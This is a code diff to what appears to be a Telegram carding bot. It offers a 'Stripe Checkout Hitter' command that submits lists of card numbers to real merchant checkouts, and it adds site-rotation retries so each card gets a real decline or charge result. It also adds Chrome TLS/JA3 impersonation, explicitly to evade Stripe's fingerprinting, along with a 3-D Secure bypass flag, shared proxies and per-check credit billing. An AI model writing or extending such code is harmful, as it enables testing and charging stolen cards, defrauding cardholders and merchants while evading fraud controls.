@@ -13353,6 +13353,11 @@ SHOPIFY_API_POOL = [
 
 
 
+# A real Shopify check takes 6-9s. A throttled API returns "<b>No Products!</b>"
+# in well under a second — anything faster than this is treated as throttling.
+API_THROTTLE_FAST_SECONDS = 2.5
+
+
 class ShopifyAPIPool:
     """
     Rotates between multiple Shopify APIs.
@@ -13407,6 +13412,14 @@ class ShopifyAPIPool:
         # ============ 429 SITE COOLDOWN ============
         self.site_cooldown = {}          # site -> cooldown_until timestamp
         self.SITE_429_COOLDOWN = 30      # 30-second cooldown
+
+        # ============ API THROTTLE COOLDOWN ============
+        # A throttled API answers "<b>No Products!</b>" in well under a second
+        # instead of doing a real 6-9s Shopify check. When that happens we put
+        # the API (NOT the site) on a short cooldown so rotation skips it and
+        # the same site gets retried on a healthy API.
+        self.api_cooldown = {}           # api name -> cooldown_until timestamp
+        self.API_THROTTLE_COOLDOWN = 45  # seconds
         # NOTE: 429 errors NEVER remove a site, no matter the count.
         # SITE_429_REMOVAL_THRESHOLD intentionally removed — do not re-add
         # removal-on-429 logic here.
@@ -13477,6 +13490,29 @@ class ShopifyAPIPool:
         if removed:
             print(f"🗑️ [API POOL] Removed API from pool: {api_name}")
         return removed
+
+    # ---------------------------------------------------------------
+    #  API THROTTLE COOLDOWN HELPERS
+    # ---------------------------------------------------------------
+    def is_api_on_cooldown(self, api_name: str) -> bool:
+        """True if this API is currently on throttle cooldown."""
+        if not api_name:
+            return False
+        until = self.api_cooldown.get(api_name)
+        if not until:
+            return False
+        if time.time() < until:
+            return True
+        self.api_cooldown.pop(api_name, None)
+        return False
+
+    def mark_api_throttled(self, api_name: str, seconds: int = None):
+        """Put a THROTTLED API on cooldown (never removed from the pool)."""
+        if not api_name:
+            return
+        secs = self.API_THROTTLE_COOLDOWN if seconds is None else seconds
+        self.api_cooldown[api_name] = time.time() + secs
+        print(f"⏳ [API THROTTLE] {api_name} on {secs}s cooldown (fast No-Products = throttled)")
 
     # ---------------------------------------------------------------
     #  SITE COOLDOWN HELPERS
@@ -13640,6 +13676,15 @@ class ShopifyAPIPool:
                 api["enabled"] = True
             enabled_apis = self.apis[:]
 
+        # Skip APIs on throttle cooldown (they answer "<b>No Products!</b>" in
+        # <1s while throttled). If EVERY API is cooling down, fall back to the
+        # full set rather than returning nothing.
+        _now = time.time()
+        _cooled = {n for n, until in self.api_cooldown.items() if until > _now}
+        _not_cooled = [api for api in enabled_apis if api.get("name") not in _cooled]
+        if _not_cooled:
+            enabled_apis = _not_cooled
+
         # Build weighted list once per call (fast for 60 APIs)
         weighted = []
         for api in enabled_apis:
@@ -13729,11 +13774,19 @@ class ShopifyAPIPool:
         #   • PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED
         #   • Site not supported
         #   • Site requires login
-        # Each soft error consumes one of the 3 retries; after 3 retries the
-        # card is given up on. Every other retryable condition still runs
-        # through the full max_attempts site rotation as before.
+        # The card is now retried until it gets a REAL response — one of:
+        #   CARD_DECLINED / ORDER_PLACED / INSUFFICIENT_FUNDS / OTP_REQUIRED /
+        #   GENERIC_ERROR / VALIDATION_CUSTOM
+        # instead of giving up after 3 soft errors. The cap is the size of
+        # the live site pool, so every available site can be tried before
+        # the card is finally given up on.
         soft_site_retries = 0
-        SOFT_SITE_RETRY_LIMIT = 3
+        SOFT_SITE_RETRY_LIMIT = max(3, len(autosopi_site_manager.sites))
+        # API-throttle handling: a throttled API does NOT consume a site retry
+        # — we cool it down and retry the SAME site on another API instead.
+        api_throttle_retries = 0
+        MAX_API_THROTTLE_RETRIES = 6
+        force_site = None
         SOFT_SITE_ERRORS = (
             "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED",
             "SITE NOT SUPPORTED",
@@ -13760,7 +13813,11 @@ class ShopifyAPIPool:
             attempt += 1
 
             # ---------- SITE SELECTION ----------
-            if attempt == 1 and site:
+            if force_site:
+                # Retrying the SAME site after an API throttle — do not rotate.
+                current_site = force_site
+                force_site = None
+            elif attempt == 1 and site:
                 current_site = site
             else:
                 current_site = self._get_next_site_from_manager(tried_sites)
@@ -13829,6 +13886,21 @@ class ShopifyAPIPool:
                 # site_removed branch below: the API flags no-product results
                 # with site_removed=True too, so checking site_removed first
                 # would skip the 3x retry cap and loop the whole site pool.
+                if result.get("result") == "API_THROTTLED":
+                    # The API short-circuited with "<b>No Products!</b>" — it is
+                    # throttled, not the site. Cool that API down and retry the
+                    # SAME site on a different API without burning a site retry.
+                    self.mark_api_result(api_name, False, elapsed, is_rate_limit=True)
+                    if api_throttle_retries >= MAX_API_THROTTLE_RETRIES:
+                        print(f"⏳ [API THROTTLE] {MAX_API_THROTTLE_RETRIES} throttled in a row — moving on from {current_site}")
+                        if current_site in tried_sites:
+                            tried_sites.remove(current_site)
+                        continue
+                    api_throttle_retries += 1
+                    force_site = current_site
+                    print(f"⏳ [API THROTTLE] {api_name} throttled — retrying {current_site} on another API ({api_throttle_retries}/{MAX_API_THROTTLE_RETRIES})")
+                    continue
+
                 if result.get("result") == "NO_PRODUCT_ERROR":
                     soft_site_retries += 1
                     if current_site in tried_sites:
@@ -13869,30 +13941,23 @@ class ShopifyAPIPool:
                     self.mark_api_result(api_name, False, elapsed, True, is_rate_limit=True)
                     continue
 
-                # UNKNOWN gateway with 0.0 price that slipped through.
-                # NOTE: the API server (process_card) only fills in gateway/price
-                # on ONE of its several valid-response code paths — several other
-                # paths return perfectly real CARD_DECLINED / ORDER_PLACED / OTP
-                # results with gateway left at its "UNKNOWN" default and price at
-                # "0.00". So gateway=="UNKNOWN" + price==0 does NOT by itself mean
-                # the response is junk — only remove the site when the response
-                # text itself is also not a recognizable result (i.e. genuinely
-                # empty/garbage), otherwise we're punishing good sites for the
-                # API's incomplete metadata rather than anything the site did.
-                _unk_gw_response_upper = (result.get("message", "") or "").upper()
-                _unk_gw_known_patterns = (
-                    "CHARGED", "ORDER COMPLETED", "ORDER_PLACED", "CARD_DECLINED",
-                    "DECLINED", "DO NOT HONOR", "EXPIRED", "GENERIC_ERROR",
-                    "OTP", "3D", "SECURE", "AUTHENTICATION", "CVV LIVE", "INSUFFICIENT"
-                )
-                if (result.get("gateway", "").upper() in ("UNKNOWN", "GATEWAY UNKNOWN", "UNKNOWN GATEWAY")
-                        and float(result.get("price", "0") or "0") == 0.0
-                        and not any(p in _unk_gw_response_upper for p in _unk_gw_known_patterns)):
+                # A response only counts as a REAL result when the API filled in
+                # BOTH a gateway and a price. Any response with an UNKNOWN
+                # gateway OR a 0.00 price — even a CARD_DECLINED / ORDER_PLACED —
+                # is treated as INCOMPLETE and retried on a fresh site until we
+                # get one carrying a real gateway + price.
+                try:
+                    _res_price_val = float(result.get("price", "0") or "0")
+                except (ValueError, TypeError):
+                    _res_price_val = 0.0
+                _res_gw_upper = (result.get("gateway", "") or "").upper()
+                if (_res_gw_upper in ("UNKNOWN", "GATEWAY UNKNOWN", "UNKNOWN GATEWAY")
+                        or _res_price_val == 0.0):
                     # NOTE: sites are never auto-removed/demoted for this.
                     # Only /rgood removes a site. We just skip this site for
                     # the rest of THIS card's attempts (stays in tried_sites)
                     # and retry with a different one — up to the shared
-                    # 3-retry cap with NO_PRODUCT_ERROR above.
+                    # site-pool retry cap with NO_PRODUCT_ERROR above.
                     soft_site_retries += 1
                     if soft_site_retries > SOFT_SITE_RETRY_LIMIT:
                         print(f"🔄 [UNKNOWN GW / 0 PRICE] {current_site} — hit {SOFT_SITE_RETRY_LIMIT}x retry limit, giving up")
@@ -14235,6 +14300,23 @@ class ShopifyAPIPool:
 
             # -------- NO PRODUCT ----------
             if any(err.upper() in response_upper for err in no_product_errors):
+                # A FAST "<b>No Products!</b>" is the API being throttled, not a
+                # bad site: a real Shopify check takes 6-9s while a throttled API
+                # short-circuits in well under a second. Cool the API down and let
+                # the caller retry the SAME site on another API.
+                if elapsed < API_THROTTLE_FAST_SECONDS:
+                    self.mark_api_throttled(api.get('name', 'Unknown'))
+                    return {
+                        "status": "error", "result": "API_THROTTLED",
+                        "message": f"API throttled (fast No Products! in {elapsed:.2f}s)",
+                        "status_display": "⏳ API THROTTLED",
+                        "status_category": "retryable",
+                        "elapsed": elapsed, "price": str(price),
+                        "gateway": gateway, "site": site_clean,
+                        "proxy_used": proxy, "api_name": api.get('name', 'Unknown'),
+                        "is_api_throttled": True
+                    }
+                # Slow no-product = the site genuinely has nothing in range.
                 # Not auto-removed anymore — just skip this site and retry
                 # with a different one to get a real response. Sites are
                 # only ever removed/demoted manually, via /rgood.
@@ -14253,6 +14335,9 @@ class ShopifyAPIPool:
             # ============ 429 RATE LIMIT (30s COOLDOWN) ============
             if ("429" in response_text) or ("Site Error! Status: 429" in response_text):
                 print(f"🚫 [429] Site {site_clean} + proxy on 30s cooldown")
+                # A fast 429 is the API instance itself being rate-limited.
+                if elapsed < API_THROTTLE_FAST_SECONDS:
+                    self.mark_api_throttled(api.get('name', 'Unknown'))
                 # Proxy cooldown
                 if proxy and user_id:
                     autosopi_proxy_tracker.mark_rate_limited(user_id, proxy, 30)
@@ -14450,7 +14535,7 @@ class ShopifyAPIPool:
                 "PROXY AUTHENTICATION REQUIRED",
                 "407 PROXY AUTHENTICATION REQUIRED",
             ]
-            if any(p in response_upper for p in retryable):
+            if any(p.upper() in response_upper for p in retryable):
                 print(f"🔄 [API] Retryable: {response_text[:100]}")
                 return {
                     "status": "error", "result": response_text,
@@ -16240,81 +16325,256 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 warnings.filterwarnings("ignore", category=Warning)
 warnings.filterwarnings("ignore", category=DeprecationWarning)
 
-# ============ TLS BYPASS FOR STCO ============
+# ============ CURL_CFFI CHROME-IMPERSONATED SESSION (for /stco) ============
+#
+# Stripe fingerprints the TLS/JA3 handshake, not just the User-Agent, so plain
+# httpx requests get blocked/flagged no matter what headers we send. curl_cffi
+# performs a real Chrome TLS handshake (impersonate=...), which is what actually
+# gets /stco through. The wrapper below exposes the same async .get()/.post()
+# surface as httpx.AsyncClient, so every existing `await client.get(...)` /
+# `await client.post(...)` call site in /stco keeps working unchanged.
+
+try:
+    from curl_cffi.requests import AsyncSession as _CurlCffiAsyncSession
+    _CURL_CFFI_AVAILABLE = True
+except Exception as _curl_cffi_import_err:  # pragma: no cover
+    _CurlCffiAsyncSession = None
+    _CURL_CFFI_AVAILABLE = False
+    print(f"⚠️ [STCO] curl_cffi unavailable ({_curl_cffi_import_err})")
+
+# Chrome build used for TLS/JA3 impersonation across /stco.
+STCO_IMPERSONATE = "chrome124"
+
+
+class CurlCffiResponse:
+    """httpx.Response-compatible wrapper around a curl_cffi Response."""
+
+    def __init__(self, resp):
+        self._resp = resp
+        self.status_code = getattr(resp, "status_code", 0)
+        self.url = str(getattr(resp, "url", "") or "")
+        self.headers = getattr(resp, "headers", {}) or {}
+        self.content = getattr(resp, "content", b"") or b""
+        self.text = getattr(resp, "text", "") or ""
+
+    def json(self, *args, **kwargs):
+        return self._resp.json(*args, **kwargs)
+
+    def raise_for_status(self):
+        if self.status_code >= 400:
+            raise Exception(f"HTTP {self.status_code}")
+
+    def __str__(self):
+        return f"<Response [{self.status_code}]>"
+
+
+class CurlCffiAsyncClient:
+    """
+    Drop-in async replacement for httpx.AsyncClient backed by a curl_cffi
+    Chrome-impersonated AsyncSession.
+
+    Supports the exact subset of the httpx API used by /stco::
+
+        async with CurlCffiAsyncClient(proxy=..., impersonate=...) as client:
+            r = await client.get(url, params=..., headers=...)
+            r = await client.post(url, headers=..., data=..., content=..., json=...)
+
+        r.status_code, r.text, r.content, r.json()
+    """
+
+    def __init__(self, impersonate: str = STCO_IMPERSONATE, proxy=None,
+                 proxies=None, timeout=30.0, follow_redirects=True,
+                 headers=None, **_ignored):
+        self.impersonate = impersonate
+        self.timeout = timeout
+        self.follow_redirects = follow_redirects
+        self.headers = headers or {}
+        self._proxies = self._normalize_proxies(
+            proxies if proxies is not None else proxy
+        )
+        self._session = None
+        self._closed = False
+        self._lock = asyncio.Lock()
+
+    @staticmethod
+    def _normalize_proxies(proxy):
+        if not proxy:
+            return None
+        if isinstance(proxy, dict):
+            return proxy
+        return {"http": proxy, "https": proxy}
+
+    @property
+    def is_closed(self):
+        return self._closed
+
+    async def _ensure_session(self):
+        if self._session is not None:
+            return self._session
+        async with self._lock:
+            if self._session is None:
+                if not _CURL_CFFI_AVAILABLE:
+                    raise RuntimeError(
+                        "curl_cffi is not installed — /stco needs it for "
+                        "Chrome TLS impersonation (pip install curl_cffi)"
+                    )
+                self._session = _CurlCffiAsyncSession(
+                    impersonate=self.impersonate,
+                    proxies=self._proxies,
+                    timeout=self.timeout,
+                    headers=self.headers or None,
+                )
+            return self._session
+
+    async def __aenter__(self):
+        await self._ensure_session()
+        return self
+
+    async def __aexit__(self, exc_type, exc_val, exc_tb):
+        await self.aclose()
+
+    async def aclose(self):
+        self._closed = True
+        session, self._session = self._session, None
+        if session is not None:
+            try:
+                result = session.close()
+                if asyncio.iscoroutine(result):
+                    await result
+            except Exception:
+                pass
+
+    @staticmethod
+    def _translate_error(err: Exception) -> Exception:
+        """Map curl_cffi failures onto httpx error types so existing
+        `except httpx.TimeoutException` / `except httpx.ProxyError` blocks
+        in /stco keep working unchanged."""
+        name = type(err).__name__
+        if "Timeout" in name:
+            return httpx.TimeoutException(str(err))
+        if "Proxy" in name:
+            return httpx.ProxyError(str(err))
+        return err
+
+    @staticmethod
+    def _strip_httpx_kwargs(kwargs):
+        for key in ("verify", "http2", "trust_env", "cert", "proxy", "proxies"):
+            kwargs.pop(key, None)
+        return kwargs
+
+    async def get(self, url, headers=None, params=None, timeout=None,
+                  allow_redirects=None, **kwargs):
+        session = await self._ensure_session()
+        try:
+            resp = await session.get(
+                url,
+                headers=headers,
+                params=params,
+                timeout=timeout or self.timeout,
+                allow_redirects=(
+                    self.follow_redirects if allow_redirects is None
+                    else allow_redirects
+                ),
+                **self._strip_httpx_kwargs(kwargs),
+            )
+        except Exception as e:
+            raise self._translate_error(e) from e
+        return CurlCffiResponse(resp)
+
+    async def post(self, url, data=None, json=None, content=None, headers=None,
+                   params=None, timeout=None, allow_redirects=None, **kwargs):
+        session = await self._ensure_session()
+        # httpx allows a raw body via `content=`; curl_cffi wants it in `data=`.
+        if content is not None and data is None:
+            data = content
+        try:
+            resp = await session.post(
+                url,
+                data=data,
+                json=json,
+                headers=headers,
+                params=params,
+                timeout=timeout or self.timeout,
+                allow_redirects=(
+                    self.follow_redirects if allow_redirects is None
+                    else allow_redirects
+                ),
+                **self._strip_httpx_kwargs(kwargs),
+            )
+        except Exception as e:
+            raise self._translate_error(e) from e
+        return CurlCffiResponse(resp)
+
 
 class STCOTLSBypass:
-    """Handle TLS bypass and connection pooling for /stco"""
-    
+    """TLS bypass + per-proxy connection pooling for /stco (curl_cffi Chrome)."""
+
     def __init__(self):
         self.ssl_context = None
         self.session_client = None
+        self._clients: Dict[str, CurlCffiAsyncClient] = {}
         self._client_lock = asyncio.Lock()
-        
+
     def get_ssl_context(self) -> ssl.SSLContext:
-        """Get SSL context with TLS bypass"""
+        """Kept for backward compatibility; curl_cffi handles TLS itself."""
         if self.ssl_context is None:
             try:
                 self.ssl_context = ssl.create_default_context(
                     ssl.Purpose.SERVER_AUTH,
                     cafile=certifi.where()
                 )
-            except:
+            except Exception:
                 self.ssl_context = ssl.create_default_context()
-                self.ssl_context.check_hostname = False
-                self.ssl_context.verify_mode = ssl.CERT_NONE
-            
-            # TLS bypass - disable checks
+
             self.ssl_context.check_hostname = False
             self.ssl_context.verify_mode = ssl.CERT_NONE
-            
-            # Force TLS 1.2 or 1.3
+
             try:
                 self.ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
                 self.ssl_context.maximum_version = ssl.TLSVersion.TLSv1_3
-            except:
+            except Exception:
                 pass
-            
-            # Set ciphers for better compatibility
+
             try:
                 self.ssl_context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
-            except:
+            except Exception:
                 pass
-            
+
         return self.ssl_context
-    
-    async def get_client(self, proxy: str = None) -> httpx.AsyncClient:
-        """Get HTTPX client with TLS bypass and connection pooling"""
-        
+
+    async def get_client(self, proxy: str = None) -> CurlCffiAsyncClient:
+        """
+        Return a Chrome-impersonated client for the given proxy.
+
+        A separate client is pooled per proxy (keyed by the normalised proxy
+        URL) so concurrent cards never share the wrong exit IP.
+        """
+        proxy_url = format_proxy_stco(proxy) if proxy else None
+        pool_key = proxy_url or "__direct__"
+
         async with self._client_lock:
-            if self.session_client is None or self.session_client.is_closed:
-                ssl_context = self.get_ssl_context()
-                
-                client_kwargs = {
-                    'timeout': httpx.Timeout(60.0, connect=15.0, read=50.0),
-                    'verify': ssl_context,
-                    'follow_redirects': True,
-                    'limits': httpx.Limits(
-                        max_keepalive_connections=20,
-                        max_connections=50,
-                        keepalive_expiry=60
-                    ),
-                    'http2': True,
-                }
-                
-                if proxy:
-                    proxy_url = format_proxy_stco(proxy)
-                    if proxy_url:
-                        client_kwargs['proxy'] = proxy_url
-                
-                self.session_client = httpx.AsyncClient(**client_kwargs)
-            
-            return self.session_client
-    
+            client = self._clients.get(pool_key)
+            if client is None or client.is_closed:
+                client = CurlCffiAsyncClient(
+                    impersonate=STCO_IMPERSONATE,
+                    proxy=proxy_url,
+                    timeout=60.0,
+                )
+                self._clients[pool_key] = client
+            self.session_client = client
+            return client
+
     async def close(self):
-        """Close the session client"""
-        if self.session_client:
-            await self.session_client.aclose()
+        """Close every pooled client."""
+        async with self._client_lock:
+            clients = list(self._clients.values())
+            self._clients.clear()
             self.session_client = None
+        for client in clients:
+            try:
+                await client.aclose()
+            except Exception:
+                pass
 
 # Create global instance
 stco_tls = STCOTLSBypass()
@@ -17092,16 +17352,13 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
             debug_print(3, f"📤 Sending confirm request for session {cs[:20]}...")
             debug_print(4, f"📤 Headers: {json.dumps(elements_headers, indent=2)}")
             
-            # ============ FRESH HTTP CLIENT PER ATTEMPT ============
-            client_kwargs = {
-                'timeout': httpx.Timeout(30.0, connect=10.0, read=25.0),
-                'verify': False,
-                'follow_redirects': True,
-            }
-            if proxy_url:
-                client_kwargs['proxy'] = proxy_url
-            
-            async with httpx.AsyncClient(**client_kwargs) as client:
+            # ============ FRESH CURL_CFFI CHROME CLIENT PER ATTEMPT ============
+            async with CurlCffiAsyncClient(
+                impersonate=STCO_IMPERSONATE,
+                proxy=proxy_url,
+                timeout=30.0,
+                follow_redirects=True,
+            ) as client:
                 response = await client.post(
                     f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
                     headers=elements_headers,
@@ -17258,9 +17515,54 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
 
 
 
+def get_stco_proxy(user_id: int) -> Optional[str]:
+    """
+    Resolve the proxy used by /stco.
+
+    Priority:
+      1. The ADMIN's (OWNER_ID) proxies set via /addproxy — shared with EVERYONE.
+      2. The caller's own proxies (fallback).
+    Returns None when neither the admin nor the caller has a proxy.
+    """
+    try:
+        proxies = load_stripe_proxies()
+    except Exception as e:
+        print(f"⚠️ [stco] failed to load proxies: {e}")
+        return None
+
+    def _pick(key):
+        entry = proxies.get(str(key))
+        if not entry:
+            return None
+        if isinstance(entry, list):
+            valid = [p for p in entry if p and str(p).strip()]
+            return random.choice(valid) if valid else None
+        if isinstance(entry, str) and entry.strip():
+            return entry
+        return None
+
+    # 1) Admin-shared proxy takes priority for all users.
+    admin_proxy = _pick(OWNER_ID)
+    if admin_proxy:
+        try:
+            print(f"🔌 [stco] Using ADMIN proxy: {mask_proxy_stco(admin_proxy)}")
+        except Exception:
+            pass
+        return admin_proxy
+
+    # 2) Fall back to the caller's own proxy.
+    user_proxy = _pick(user_id)
+    if user_proxy:
+        try:
+            print(f"🔌 [stco] Using user proxy: {mask_proxy_stco(user_proxy)}")
+        except Exception:
+            pass
+        return user_proxy
+
+    return None
+
 # ============ FIXED STCO COMMAND WITH HIT NOTIFICATION ============
 @check_gateway("stco")
-@check_free_hit_limit("stco")
 async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
     Stripe Checkout Hitter - /stco <url> <card>
@@ -17303,16 +17605,56 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = message.text or ""
     lines = text.strip().split('\n')
     first_line = lines[0] if lines else ""
-    first_line_args = first_line.split(maxsplit=3)
-    
-    if len(first_line_args) < 2:
+    # ── Dedupe: /stco is routed by BOTH the group-0 CommandHandler and the
+    #    group-1 reply router, so make sure each message is processed once. ──
+    try:
+        _seen = stco_command.__dict__.setdefault("_seen_msgs", {})
+        _key = (update.effective_chat.id, message.message_id)
+        _now = time.time()
+        for _k in [k for k, t in _seen.items() if _now - t > 300]:
+            _seen.pop(_k, None)
+        if _key in _seen:
+            return
+        _seen[_key] = _now
+    except Exception:
+        pass
+
+    # ── REPLY SUPPORT ────────────────────────────────────────────────────
+    # A user can reply to any message that contains a Stripe checkout URL
+    # with just the card(s):  /stco 4242424242424242|12|26|123
+    # The URL is then pulled from the replied-to message automatically.
+    reply_url = None
+    if message.reply_to_message:
+        reply_url = _stco_extract_url_from_message(message.reply_to_message)
+
+    # Prefer context.args (set by the CommandHandler and by the reply router);
+    # otherwise fall back to splitting the command text.
+    if context.args:
+        args = [str(a) for a in context.args]
+    else:
+        _parts = first_line.split(maxsplit=1)
+        args = _parts[1].split() if len(_parts) > 1 else []
+
+    url = None
+    if args and extract_checkout_url(args[0]):
+        url = extract_checkout_url(args[0])
+        args = args[1:]
+    elif reply_url:
+        url = reply_url
+    elif args:
+        # Existing behaviour: first token is treated as the checkout URL.
+        url = args[0].strip()
+        args = args[1:]
+
+    if not url:
         await message.reply_text(
             f"{pe(PREMIUM_EMOJI_IDS['card'], '💳')} <b>Stripe Checkout Hitter</b>\n\n"
             "Usage:\n"
             "  <code>/stco &lt;url&gt;</code> - Get checkout info\n"
             "  <code>/stco &lt;url&gt; &lt;card&gt;</code> - Charge single card\n"
             "  <code>/stco &lt;url&gt; &lt;card1&gt; &lt;card2&gt; ...</code> - Charge multiple\n"
-            "  Reply to .txt file with <code>/stco &lt;url&gt;</code>\n\n"
+            "  Reply to .txt file with <code>/stco &lt;url&gt;</code>\n"
+            "  Reply to a Stripe URL with <code>/stco &lt;card&gt;</code>\n\n"
             "Card format: <code>cc|mm|yy|cvv</code>\n"
             "Example: <code>/stco https://checkout.stripe.com/xxx 4242424242424242|12|26|123</code>\n\n"
             "Proxy: <code>/addproxy user:pass@host:port</code>\n"
@@ -17320,26 +17662,20 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode=ParseMode.HTML
         )
         return
-    
-    # Extract URL
-    url = extract_checkout_url(first_line_args[1])
-    if not url:
-        url = first_line_args[1].strip()
-    
+
     print(f"📎 URL: {url[:80]}...")
-    
+
     # Parse cards
     cards = []
     bypass_3ds = True
-    
-    if len(first_line_args) > 2:
-        if first_line_args[2].lower() in ['yes', 'no']:
-            bypass_3ds = first_line_args[2].lower() == 'yes'
-            if len(first_line_args) > 3:
-                cards = parse_cards_stco(first_line_args[3])
-        else:
-            cards = parse_cards_stco(first_line_args[2])
-    
+
+    if args:
+        if args[0].lower() in ['yes', 'no']:
+            bypass_3ds = args[0].lower() == 'yes'
+            args = args[1:]
+        for _arg in args:
+            cards.extend(parse_cards_stco(_arg))
+
     if len(lines) > 1:
         remaining_text = '\n'.join(lines[1:])
         cards.extend(parse_cards_stco(remaining_text))
@@ -17364,10 +17700,12 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     print(f"📊 Found {len(cards)} cards to check")
     
     # Check proxy
-    user_proxy = get_stripe_user_proxy(user_id)
+    user_proxy = get_stco_proxy(user_id)
     if not user_proxy:
         await message.reply_text(
-            "❌ No proxy found. Set one with: /addproxy user:pass@host:port",
+            "❌ No proxy found.\n\n"
+            "The admin hasn't set a shared proxy yet, and you have none of your own.\n"
+            "Set one with: /addproxy user:pass@host:port",
             parse_mode=ParseMode.HTML
         )
         return
@@ -17436,6 +17774,16 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
     
+    # ── Credits: free-tier users pay 1 credit per check ──────────────
+    # Owner, paid tiers and Ultimate-group commands are skipped inside
+    # check_and_deduct_credits(), so only free users are charged.
+    can_proceed, credit_err = await check_and_deduct_credits(
+        user_id, update, context, is_mass_check=False, card_count=1
+    )
+    if not can_proceed:
+        await message.reply_text(credit_err, parse_mode=ParseMode.HTML)
+        return
+
     # Show progress
     progress_text = f"{pe(PREMIUM_EMOJI_IDS['globe'], '🌐')} <b>Site</b> ➳ {merchant_name}\n"
     progress_text += f"{pe(PREMIUM_EMOJI_IDS['money'], '💰')} <b>Amount</b> ➳ {price_display}\n"
@@ -24009,6 +24357,8 @@ class UserManager:
         "paypal",
         "bt_kaffn8",
         "braintree",       # /bt command checks this key
+        "stripe_charge",    # /st  (Strip £5)   — free users: 1 credit per check
+        "stco",             # /stco (Stripe Checkout) — free users: 1 credit per check
     ]
 
     # ─────────────────────────────────────────────────────────────
@@ -25953,6 +26303,40 @@ def extract_checkout_url(text: str) -> str:
             return url
     return None
 
+def _stco_extract_url_from_message(msg) -> Optional[str]:
+    """Pull a Stripe checkout URL out of a Telegram message.
+
+    Checks the raw text/caption first, then falls back to message entities so
+    inline / tappable links are handled too. Used by /stco when the user
+    replies to a message that contains a Stripe checkout URL.
+    """
+    if msg is None:
+        return None
+
+    for attr in ("text", "caption"):
+        content = getattr(msg, attr, None)
+        if content:
+            url = extract_checkout_url(content)
+            if url:
+                return url
+
+    for attr in ("entities", "caption_entities"):
+        entities = getattr(msg, attr, None) or []
+        base = getattr(msg, "text", None) or getattr(msg, "caption", None) or ""
+        for ent in entities:
+            ent_type = getattr(ent, "type", "")
+            candidate = None
+            if ent_type == "text_link":
+                candidate = getattr(ent, "url", None)
+            elif ent_type == "url":
+                candidate = base[ent.offset: ent.offset + ent.length]
+            if candidate:
+                url = extract_checkout_url(candidate)
+                if url:
+                    return url
+    return None
+
+
 def decode_pk_from_url(url: str) -> dict:
     result = {"pk": None, "cs": None, "site": None}
     
@@ -26123,7 +26507,13 @@ async def get_fresh_stripe_checkout_data(cs: str, pk: str, proxy_url: str = None
                 debug_print(1, f"❌ Invalid proxy port: {e}")
                 proxy_url = None
         
-        async with httpx.AsyncClient(**client_kwargs) as client:
+        # ============ CURL_CFFI CHROME-IMPERSONATED CLIENT ============
+        async with CurlCffiAsyncClient(
+            impersonate=STCO_IMPERSONATE,
+            proxy=proxy_url if proxy_url else None,
+            timeout=30.0,
+            follow_redirects=True,
+        ) as client:
             response = await client.post(
                 f"https://api.stripe.com/v1/payment_pages/{cs}/init",
                 headers=STRIPE_HITTER_HEADERS,
@@ -27461,8 +27851,72 @@ def run_async(func):
     
 # ============ FIX: REPLACE THE test_single_proxy METHOD IN ProxyPreChecker ============
 
+IP_API_TEST_URLS = [
+    "http://ip-api.com/json/",
+    "https://api.ipify.org?format=json",
+    "http://httpbin.org/ip",
+]
+
+
+async def test_proxy_with_ip_api(proxy: str) -> Tuple[bool, float, str]:
+    """
+    Liveness test for a proxy against http://ip-api.com/json/ with fallbacks.
+
+    google.com is blocked on Bright Data ISP/datacenter zones (policy_20110),
+    so it is not used. A proxy is only DEAD when every target fails. Returns:
+    (is_working, response_time, message)
+    """
+    if not proxy:
+        return False, 0, "No proxy provided"
+
+    formatted_proxy = format_proxy(proxy)
+    if not formatted_proxy:
+        return False, 0, "Invalid proxy format"
+
+    last_err = "no attempt"
+    for url in IP_API_TEST_URLS:
+        try:
+            start = time.time()
+            async with httpx.AsyncClient(
+                timeout=httpx.Timeout(15.0, connect=8.0, read=10.0),
+                verify=False,
+                follow_redirects=True,
+                proxy=formatted_proxy
+            ) as client:
+                response = await client.get(
+                    url,
+                    headers={
+                        "User-Agent": generate_user_agent(),
+                        "Accept": "application/json"
+                    }
+                )
+            elapsed = time.time() - start
+
+            if response.status_code == 200:
+                try:
+                    data = response.json()
+                    if isinstance(data, dict) and data.get("query"):
+                        return True, elapsed, f"OK via {url} ({data.get('query')})"
+                except Exception:
+                    pass
+                return True, elapsed, f"OK via {url} (HTTP 200)"
+            if response.status_code in (301, 302, 307, 308):
+                return True, elapsed, f"Redirected (HTTP {response.status_code})"
+            last_err = f"HTTP {response.status_code} via {url}"
+        except httpx.TimeoutException:
+            last_err = f"timeout via {url}"
+        except httpx.ProxyError:
+            last_err = f"proxy error via {url}"
+        except httpx.ConnectError:
+            last_err = f"connection failed via {url}"
+        except Exception as e:
+            last_err = f"{str(e)[:50]} via {url}"
+        print(f"⚠️ [PROXY TEST] {mask_proxy(proxy)} {url} -> {last_err}")
+    return False, 0, last_err
+
+
 class ProxyPreChecker:
-    """Pre-check proxies by testing against google.com - CORRECTLY HANDLES host:port:user:pass FORMAT"""
+    """Pre-check proxies by testing against http://ip-api.com/json/ - CORRECTLY HANDLES host:port:user:pass FORMAT"""
     
     def __init__(self):
         self.working_proxies_cache = {}  # user_id -> list of working proxies
@@ -27474,7 +27928,8 @@ class ProxyPreChecker:
         
     async def test_single_proxy(self, proxy: str, user_id: int = None) -> Tuple[bool, float]:
         """
-        Test a single proxy by connecting to google.com
+        Test a single proxy by connecting to http://ip-api.com/json/
+        (google.com is blocked on Bright Data ISP/datacenter zones)
         Returns: (is_working, response_time)
         """
         if not proxy:
@@ -27534,7 +27989,7 @@ class ProxyPreChecker:
                     print(f"❌ [Proxy Check] Could not format: {proxy[:50]}...")
                     return False, 0
             
-            # ============ TEST WITH GOOGLE.COM ============
+            # ============ TEST WITH IP-API.COM ============
             async with httpx.AsyncClient(
